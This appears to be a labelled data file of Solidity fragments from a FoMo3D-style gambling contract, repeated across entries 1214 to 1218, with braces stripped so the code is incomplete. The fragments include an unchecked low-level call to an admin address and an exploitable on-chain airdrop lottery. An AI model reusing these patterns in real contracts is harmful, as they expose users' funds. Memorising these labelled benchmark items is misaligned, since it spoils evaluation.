uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1214 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1215 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1216 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1217 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
1218 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
